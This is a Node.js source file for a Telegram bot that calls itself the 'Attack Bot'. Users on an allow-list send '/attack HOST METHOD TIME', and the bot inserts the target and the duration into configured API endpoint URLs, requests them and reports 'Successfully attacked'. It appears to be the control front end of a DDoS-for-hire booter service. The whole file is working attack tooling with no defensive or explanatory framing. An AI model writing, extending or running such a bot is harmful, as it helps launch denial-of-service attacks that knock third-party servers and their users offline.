const TelegramBot = require('node-telegram-bot-api');
const request = require('request');
const fs = require('fs');

const config = JSON.parse(fs.readFileSync('config.json'));

const bot = new TelegramBot(config.bot_token, { polling: true });

const allowedUserIds = config.allowed_user_ids;
const availableMethods = config.available_methods;
const apiEndpoints = config.api_endpoints;

bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!allowedUserIds.includes(userId)) {
        bot.sendMessage(chatId, "You are not authorized to use this bot.");
        return;
    }

    const user_input = match[1].split(' ');
    if (user_input.length !== 3) {
        const missing_params = [];
        if (user_input.length === 0) {
            missing_params.push("HOST");
        }
        if (user_input.length <= 1) {
            missing_params.push("METHOD");
        }
        if (user_input.length <= 2) {
            missing_params.push("TIME");
        }
        const missing_params_message = "Missing parameters: " + missing_params.join(', ');
        bot.sendMessage(chatId, missing_params_message);
        return;
    }

    const [host, method, time] = user_input;

    if (!availableMethods.includes(method)) {
        bot.sendMessage(chatId, "Unknown method. Use /methods to see available methods.");
        return;
    }

    const url = apiEndpoints[method];
    if (!url) {
        bot.sendMessage(chatId, "Method not supported.");
        return;
    }

    const formattedUrl = url.replace("{host}", host).replace("{time}", time);

    request(formattedUrl, (error, response, body) => {
        if (!error && response.statusCode == 200) {
            const attackDetails = `Successfully attacked 🚀\nHost: ${host}\nMethod: ${method}\nTime: ${time}`;
            bot.sendMessage(chatId, attackDetails);
        } else {
            bot.sendMessage(chatId, "Failed to send attack request.");
        }
    });
});

bot.onText(/\/methods/, (msg) => {
    const methods = "Available methods: " + availableMethods.join(', ');
    bot.sendMessage(msg.chat.id, methods);
});

bot.onText(/\/start|\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome to the Attack Bot! Use /attack {HOST} {METHOD} {TIME} to launch an attack or /methods to see available methods.");
});
